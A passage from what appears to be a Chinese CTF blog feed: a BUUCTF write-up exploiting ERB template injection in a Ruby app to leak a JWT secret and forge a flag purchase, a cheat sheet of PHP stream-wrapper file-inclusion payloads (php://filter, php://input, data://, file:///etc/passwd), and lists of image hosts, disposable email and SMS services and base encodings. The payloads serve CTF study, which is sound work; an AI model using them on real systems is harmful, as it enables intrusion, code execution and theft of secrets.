  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode payload<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">'HS256'</span></span>
  cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth
<span class="token keyword">end</span>

get <span class="token string-literal"><span class="token string">"/api/info"</span></span> <span class="token keyword">do</span>
  islogin
  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token symbol">algorithm</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HS256'</span></span> <span class="token punctuation">&#125;</span>
  json<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token symbol">uid</span><span class="token operator">:</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"uid"</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token symbol">jkl</span><span class="token operator">:</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"jkl"</span></span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">end</span>

get <span class="token string-literal"><span class="token string">"/shop"</span></span> <span class="token keyword">do</span>
  erb <span class="token symbol">:shop</span>
<span class="token keyword">end</span>

get <span class="token string-literal"><span class="token string">"/work"</span></span> <span class="token keyword">do</span>
  islogin
  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token symbol">algorithm</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HS256'</span></span> <span class="token punctuation">&#125;</span>
  auth <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
  <span class="token keyword">unless</span> params<span class="token punctuation">[</span><span class="token symbol">:SECRET</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">nil</span><span class="token operator">?</span>
    <span class="token keyword">if</span> <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">params<span class="token punctuation">[</span><span class="token symbol">:SECRET</span><span class="token punctuation">]</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token regex-literal"><span class="token regex">/[0-9a-z]+/</span></span><span class="token punctuation">)</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
      puts <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"FLAG"</span></span><span class="token punctuation">]</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>

  <span class="token keyword">if</span> params<span class="token punctuation">[</span><span class="token symbol">:do</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">params<span class="token punctuation">[</span><span class="token symbol">:name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> is working"</span></span> <span class="token keyword">then</span>

    auth<span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"jkl"</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"jkl"</span></span><span class="token punctuation">]</span><span class="token punctuation">.</span>to_i <span class="token operator">+</span> SecureRandom<span class="token punctuation">.</span>random_number<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
    auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode auth<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">'HS256'</span></span>
    cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth
    <span class="token constant">ERB</span><span class="token double-colon punctuation">::</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"&lt;script>alert('</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">params<span class="token punctuation">[</span><span class="token symbol">:name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> working successfully!')&lt;/script>"</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>result

  <span class="token keyword">end</span>
<span class="token keyword">end</span>

post <span class="token string-literal"><span class="token string">"/shop"</span></span> <span class="token keyword">do</span>
  islogin
  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token symbol">algorithm</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HS256'</span></span> <span class="token punctuation">&#125;</span>

  <span class="token keyword">if</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"jkl"</span></span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token constant">FLAGPRICE</span> <span class="token keyword">then</span>

    json<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token symbol">title</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"error"</span></span><span class="token punctuation">,</span><span class="token symbol">message</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"no enough jkl"</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token keyword">else</span>

    auth <span class="token operator">&lt;&lt;</span> <span class="token punctuation">&#123;</span><span class="token symbol">flag</span><span class="token operator">:</span> <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"FLAG"</span></span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>
    auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode auth<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">'HS256'</span></span>
    cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth
    json<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token symbol">title</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"success"</span></span><span class="token punctuation">,</span><span class="token symbol">message</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"jkl is good thing"</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>


<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">islogin</span></span>
  <span class="token keyword">if</span> cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">nil</span><span class="token operator">?</span> <span class="token keyword">then</span>
    redirect to<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'/shop'</span></span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ruby语言。。。将就着看吧，结合gpt解释还有语言的通性，关注重要代码：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">get <span class="token string-literal"><span class="token string">"/work"</span></span> <span class="token keyword">do</span>
  islogin
  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token symbol">algorithm</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HS256'</span></span> <span class="token punctuation">&#125;</span>
  auth <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
  <span class="token keyword">unless</span> params<span class="token punctuation">[</span><span class="token symbol">:SECRET</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">nil</span><span class="token operator">?</span>
    <span class="token keyword">if</span> <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">params<span class="token punctuation">[</span><span class="token symbol">:SECRET</span><span class="token punctuation">]</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token regex-literal"><span class="token regex">/[0-9a-z]+/</span></span><span class="token punctuation">)</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
      puts <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"FLAG"</span></span><span class="token punctuation">]</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>

  <span class="token keyword">if</span> params<span class="token punctuation">[</span><span class="token symbol">:do</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">params<span class="token punctuation">[</span><span class="token symbol">:name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> is working"</span></span> <span class="token keyword">then</span>

    auth<span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"jkl"</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"jkl"</span></span><span class="token punctuation">]</span><span class="token punctuation">.</span>to_i <span class="token operator">+</span> SecureRandom<span class="token punctuation">.</span>random_number<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
    auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode auth<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">'HS256'</span></span>
    cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth
    <span class="token constant">ERB</span><span class="token double-colon punctuation">::</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"&lt;script>alert('</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">params<span class="token punctuation">[</span><span class="token symbol">:name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> working successfully!')&lt;/script>"</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>result

  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当do和name值相等的时候会输出key。wp说存在erb模板注入，注入格式为<code>&lt;%= code %&gt;</code>，这里已经存在5个字符，还差2个字符，也就是能控制的字符只有2个字符。<br>特性请看<a href="https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html">文档</a><br><code>if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</code><br>直接拿环境里的<code>secret</code>进行正则匹配，如果输入<code>SECRET=</code>就是无字符匹配，这是<code>$&#39;</code>就是<code>ENV[&#39;SECRET&#39;]</code>了<br>从源码中可以知道可以直接回显<code>&lt;%=$&#39;%&gt;</code><br>通过使用<code>name=&lt;%=$&#39;%&gt;&amp;do=&lt;%=$&#39;%&gt; is working</code><br>构造出下面的Payload：</p>
<blockquote>
<p><code>/work?SECRET=&amp;name=&lt;%=$&#39;%&gt;&amp;do=&lt;%=$&#39;%&gt; is working</code><br>然后进行urlencode<br><code>/work?SECRET=&amp;name=%3C%25%3D$&#39;%25%3E&amp;do=%3C%25%3D$&#39;%25%3E%20is%20working</code></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/direct/590309a439954af3ad69091153791d70.png" alt="123"></p>
<p>使用key更改jkl值从而购买flag<br><img src="https://img-blog.csdnimg.cn/direct/426b57ac539840d2bfb9d09f989a046b.png" alt="798"><br>拿到flag<br><img src="https://img-blog.csdnimg.cn/direct/0594c7c9ffa14a24823fd80f5e3baa73.png" alt="123"></p>
]]></content>
      <categories>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF中常用的php伪协议总结</title>
    <url>/2022/12/29/CTF%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">php<span class="token punctuation">:</span><span class="token operator">//</span> — 访问各个输入<span class="token operator">/</span>输出流（I<span class="token operator">/</span>O streams）
<span class="token builtin">file</span><span class="token punctuation">:</span><span class="token operator">//</span> — 访问本地文件系统
phar<span class="token punctuation">:</span><span class="token operator">//</span> — PHP 归档
zlib<span class="token punctuation">:</span><span class="token operator">//</span> — 压缩流
data<span class="token punctuation">:</span><span class="token operator">//</span> — 数据（RFC <span class="token number">2397</span>）
http<span class="token punctuation">:</span><span class="token operator">//</span> — 访问 HTTP<span class="token punctuation">(</span>s<span class="token punctuation">)</span> 网址
ftp<span class="token punctuation">:</span><span class="token operator">//</span> — 访问 FTP<span class="token punctuation">(</span>s<span class="token punctuation">)</span> URLs
glob<span class="token punctuation">:</span><span class="token operator">//</span> — 查找匹配的文件路径模式
ssh2<span class="token punctuation">:</span><span class="token operator">//</span> — Secure Shell <span class="token number">2</span>
rar<span class="token punctuation">:</span><span class="token operator">//</span> — RAR
ogg<span class="token punctuation">:</span><span class="token operator">//</span> — 音频流
expect<span class="token punctuation">:</span><span class="token operator">//</span> — 处理交互式的流<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h2><p>用于访问本地文件系统，并且不受<code>allow_url_fopen</code>，<code>allow_url_include</code>影响<br> <code>file://</code>协议主要用于访问文件(绝对路径、相对路径以及网络路径)<br> 比如：<code>http://www.xx.com?file=file:///etc/passsword</code></p>
<h2 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h2><p>在<code>allow_url_fopen</code>，<code>allow_url_include</code>都关闭的情况下可以正常使用<br> <code>php://</code>作用为访问输入输出流</p>
<h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>读取源代码并编码输出，例如：<br> <code>http://127.0.0.1/cmd.php?cmd=php://filter/read=convert.base64-encode/resource=[文件名]（针对php文件需要base64编码）</code><br> 说明：<br> <code>resource=&lt;要过滤的数据流&gt;</code> 这个参数是必须的。它指定了你要筛选过滤的数据流<br> <code>read=&lt;读链的筛选列表&gt;</code> 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。<br> <code>write=&lt;写链的筛选列表&gt;</code>该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。<br> <code>&lt;；两个链的筛选列表&gt;</code> 任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</p>
<h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p><code>php://input</code>执行post数据中的代码：<br> 例如：<br> <code>http://127.0.0.1/cmd.php?cmd=php://input</code><br> POST数据：<code>&lt;?php phpinfo()?&gt;</code><br> 注意：<br> 当<code>enctype=&quot;multipart/form-data&quot;的时候</code> php:&#x2F;&#x2F;input&#96; 是无效的</p>
<h2 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><p>自PHP&gt;&#x3D;5.2.0起，可以使用data:&#x2F;&#x2F;数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到base64编码传输<br> 比如：<br> 通过data:&#x2F;&#x2F;text&#x2F;plain协议来进行漏洞利用。<br> <code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code><br> <code>url=data://text/plain,&lt;?php print_r(glob(&quot;*&quot;)); ?&gt;</code></p>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>优质图床</title>
    <url>/2022/12/28/%E4%BC%98%E8%B4%A8%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="图床"><a href="#图床" class="headerlink" title="图床"></a>图床</h1><p>给大家推荐一些免费好用的优质图床：</p>
<p>1、SM.MS：<a href="https://sm.ms/">https://sm.ms</a></p>
<p>2、imgbox：<a href="https://imgbox.com/">https://imgbox.com</a></p>
<p>3、Postimage：<a href="https://postimages.org/">https://postimages.org</a></p>
<p>4、imgurl：<a href="https://imgurl.org/">https://imgurl.org</a></p>
<p>5、路过图床：<a href="https://imgchr.com/">https://imgchr.com</a></p>
<p>6、Coding 图床：<a href="http://picbed.librejo.cn/">http://picbed.librejo.cn</a></p>
<p>7、图库：<a href="http://tuku.link/">http://tuku.link</a></p>
<p>8、牛图网：<a href="https://www.niupic.com/">https://www.niupic.com</a></p>
<p>需要登录的图床：</p>
<p>1、imgur：<a href="https://imgur.com/">https://imgur.com</a></p>
<p>2、聚合图床：<a href="https://www.superbed.cn/">https://www.superbed.cn</a></p>
<p>3、hualigs：<a href="https://www.hualigs.cn/">https://www.hualigs.cn</a></p>
<p>4、Hello 图床：<a href="https://www.helloimg.com/">https://www.helloimg.com</a></p>
]]></content>
      <categories>
        <category>小工具</category>
      </categories>
  </entry>
  <entry>
    <title>临时邮箱和临时手机号</title>
    <url>/2022/12/28/%E4%B8%B4%E6%97%B6%E9%82%AE%E7%AE%B1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="临时邮箱"><a href="#临时邮箱" class="headerlink" title="临时邮箱"></a>临时邮箱</h1><p>临时邮箱有什么用？有时候注册某些服务必须提供邮箱，但你又不想使用你常用的邮箱，因为你不想收到不必要的垃圾邮件。<br>又有些时候你只是想试用一次某些服务，你不想使用常用邮箱注册。<br>临时邮箱应运而生，在注册这些不重要的服务时使用临时邮箱作为替身是个很好的选择。<br>临时邮箱具有匿名性，能有效减少垃圾邮件。</p>
<h2 id="邮箱网址"><a href="#邮箱网址" class="headerlink" title="邮箱网址"></a>邮箱网址</h2><p><a href="https://temp-mail.org/zh">https://temp-mail.org/zh</a></p>
<p><a href="https://www.mohmal.com/zh">https://www.mohmal.com/zh</a></p>
<p><a href="https://10minutemail.net/">https://10minutemail.net</a></p>
<p><a href="https://www.yinsiduanxin.com/mail.html">https://www.yinsiduanxin.com/mail.html</a></p>
<p><a href="https://bccto.me/">https://bccto.me</a></p>
<p><a href="https://www.guerrillamail.com/zh">https://www.guerrillamail.com/zh</a></p>
<p><a href="http://mailcatch.com/">http://mailcatch.com</a></p>
<p><a href="https://10minutemail.com/">https://10minutemail.com</a></p>
<p><a href="http://www.yopmail.com/zh">http://www.yopmail.com/zh</a></p>
<p><a href="https://9em.org/">https://9em.org</a></p>
<p><a href="http://0x5f3759df.cn/">http://0x5f3759df.cn</a></p>
<h1 id="手机号"><a href="#手机号" class="headerlink" title="手机号"></a>手机号</h1><p>临时手机号有什么用？有时候注册某些服务必须提供手机号，但你又不想使用你常用的手机号，因为你不想收到不必要的垃圾短信。<br>又有些时候你只是想试用一次某些服务，你不想使用常用手机号注册。<br>临时手机号应运而生，在注册这些不重要的服务时使用临时手机号作为替身是个很好的选择。<br>临时手机号具有匿名性，能有效减少垃圾短信。</p>
<p>这里我给大家推荐一些好用的国内外免费短信接码平台：</p>
<h2 id="手机号网址"><a href="#手机号网址" class="headerlink" title="手机号网址"></a>手机号网址</h2><p>1、SMS Receive Free：<a href="https://smsreceivefree.com/">https://smsreceivefree.com</a></p>
<p>2、云接码：<a href="https://yunjiema.net/">https://yunjiema.net</a></p>
<p>3、小鸟接码：<a href="http://www.xnsms.com/">http://www.xnsms.com</a></p>
<p>4、接码号：<a href="https://jiemahao.com/">https://jiemahao.com</a></p>
<p>5、shejiinn：<a href="https://www.shejiinn.com/">https://www.shejiinn.com</a></p>
<p>6、mffac：<a href="https://www.mffac.com/">https://www.mffac.com</a></p>
<p>7、云短信：<a href="https://yunduanxin.net/">https://yunduanxin.net</a></p>
<p>8、免费接码：<a href="https://mianfeijiema.com/">https://mianfeijiema.com</a></p>
<p>9、FreePhoneNum：<a href="https://freephonenum.com/">https://freephonenum.com</a></p>
<p>10、ZUSMS：<a href="https://www.zusms.com/">https://www.zusms.com</a></p>
<p>11、Free Online Phone：<a href="https://www.freeonlinephone.org/">https://www.freeonlinephone.org</a></p>
<p>12、receiveasms：<a href="https://receiveasms.com/">https://receiveasms.com</a></p>
<p>13、materialtools：<a href="https://www.materialtools.com/">https://www.materialtools.com</a></p>
<p>14、receivesmsonline：<a href="https://www.receivesmsonline.net/">https://www.receivesmsonline.net</a></p>
<p>15、Receive SMS Online：<a href="http://receive-sms-online.com/">http://receive-sms-online.com</a></p>
<p>16、MICSMS：<a href="https://www.micsms.com/">https://www.micsms.com</a></p>
<p>17、隐私短信：<a href="https://www.yinsiduanxin.com/">https://www.yinsiduanxin.com</a></p>
<p>18、becmd：<a href="https://www.becmd.com/">https://www.becmd.com</a></p>
<p>19、z-sms：<a href="http://www.z-sms.com/">http://www.z-sms.com</a></p>
<p>20、随用随弃：<a href="https://www.suiyongsuiqi.com/">https://www.suiyongsuiqi.com</a></p>
<p>21、we39：<a href="https://www.we39.cn/">https://www.we39.cn</a></p>
]]></content>
      <categories>
        <category>小工具</category>
      </categories>
  </entry>
  <entry>
    <title>Crypto中可能用的密码</title>
    <url>/2022/12/19/Crypto%E4%B8%AD%E5%8F%AF%E8%83%BD%E7%94%A8%E7%9A%84%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="常见的密码特征"><a href="#常见的密码特征" class="headerlink" title="常见的密码特征"></a>常见的密码特征</h1><h2 id="base密码"><a href="#base密码" class="headerlink" title="base密码"></a>base密码</h2><h3 id="base100"><a href="#base100" class="headerlink" title="base100"></a>base100</h3><p><strong>特点：密文由 Emoji 表情组成。</strong></p>
<table>
<thead>
<tr>
<th>原文</th>
<th>base100加密</th>
</tr>
</thead>
<tbody><tr>
<td>flag</td>
<td>👝👣👘👞</td>
</tr>
<tr>
<td>flag{gycfev123FGH_}</td>
<td>👝👣👘👞👲👞👰👚👝👜👭🐨🐩🐪🐽🐾🐿👖👴</td>
</tr>
</tbody></table>
<h3 id="base92"><a href="#base92" class="headerlink" title="base92"></a>base92</h3><p><em>特征特点：密文由92个字符（0-9，a-z，A-Z,!#$%&amp;()</em>+,.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;{|}”~）*组成<br><strong>比base91多一个 。</strong></p>
<h3 id="base91"><a href="#base91" class="headerlink" title="base91"></a>base91</h3><p><strong>特点：密文由91个字符（0-9，a-z，A-Z,!#$%&amp;()*+,.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;{|}~”）组成 。</strong></p>
<table>
<thead>
<tr>
<th>原文</th>
<th>base91加密</th>
</tr>
</thead>
<tbody><tr>
<td>flag</td>
<td>@iH&lt;Z</td>
</tr>
<tr>
<td>flag{ASD231fgh_hj}</td>
<td>@iH&lt;,{cSBMB.9*gkg}Q2S}A</td>
</tr>
</tbody></table>
<h3 id="base85"><a href="#base85" class="headerlink" title="base85"></a>base85</h3><p><strong>特点：奇怪的字符比较多，但是很难出现等号。</strong></p>
<table>
<thead>
<tr>
<th>原文</th>
<th>base85加密</th>
</tr>
</thead>
<tbody><tr>
<td>flag</td>
<td>Ao(mg</td>
</tr>
<tr>
<td>flag{}JK_gisyu</td>
<td>Ao(mgH[SLZ?Y&#x3D;(oH$’</td>
</tr>
</tbody></table>
<h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p><strong>特点：密文由64个字符(A-Z,a-z,0-9,+,&#x2F;)组成，一般情况下密文尾部都会有两个等号，明文很少的时候则没有；</strong></p>
<table>
<thead>
<tr>
<th>原文</th>
<th>base64加密</th>
</tr>
</thead>
<tbody><tr>
<td>flag{asdfgs1sedfvfvdfd2345_}</td>
<td>ZmxhZ3thc2RmZ3Mxc2VkZnZmdmRmZDIzNDVffQ&#x3D;&#x3D;</td>
</tr>
<tr>
<td>flag{asdfgsdfd2345_}</td>
<td>ZmxhZ3thc2RmZ3NkZmQyMzQ1X30&#x3D;</td>
</tr>
<tr>
<td>flag</td>
<td>ZmxhZw&#x3D;&#x3D;</td>
</tr>
<tr>
<td>sdfdfc</td>
<td>c2RmZGZj</td>
</tr>
</tbody></table>
<h3 id="base62"><a href="#base62" class="headerlink" title="base62"></a>base62</h3><p><strong>特征特点：密文由62字符（0-9，a-z，A-Z）组成</strong></p>
<h3 id="base58"><a href="#base58" class="headerlink" title="base58"></a>base58</h3><p><strong>特点： Base58是用于Bitcoin中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址，Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+”和”&#x2F;”符号</strong></p>
<table>
<thead>
<tr>
<th>原文</th>
<th>base58加密</th>
</tr>
</thead>
<tbody><tr>
<td>flag</td>
<td>3cr9Ae</td>
</tr>
<tr>
<td>flag{4561230ASDO}</td>
<td>xpoetRNMzw3NmoorXfTgNTn</td>
</tr>
